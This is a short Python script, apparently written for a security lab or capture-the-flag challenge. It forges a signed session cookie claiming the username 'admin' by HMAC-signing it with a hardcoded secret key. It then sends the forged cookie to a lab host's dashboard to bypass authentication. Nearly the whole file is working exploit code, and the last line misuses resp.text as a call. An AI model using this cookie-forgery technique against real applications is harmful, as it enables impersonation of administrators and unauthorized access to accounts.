import hmac
import base64
import requests
from hashlib import sha1
def sign(data, key):
    key = key.encode()
    data = data.encode()
    hashData = hmac.new(key, data, sha1)
    signData = base64.encodebytes(hashData.digest()).decode('utf-8')
    return signData.replace('/', '_').replace('+', '-').replace('=', '').replace('\n','')
 
secret_key = "RkZTTpvUNHgUrpR657q42yaeVMwBpWCI"
cookie_sig = sign('session=eyJ1c2VybmFtZSI6ImFkbWluIn0', secret_key)
# eyJ1c2VybmFtZSI6ImFkbWluIn0 is base64 value of {"username":"admin"}
cookies = {'session': 'eyJ1c2VybmFtZSI6ImFkbWluIn0', 'session.sig': cookie_sig}
print(cookies['session.sig'])
resp = requests.get(f'https://mutation-lab-4774798b.dailycookie.cloud//dashboard', cookies=cookies)
print(resp.text())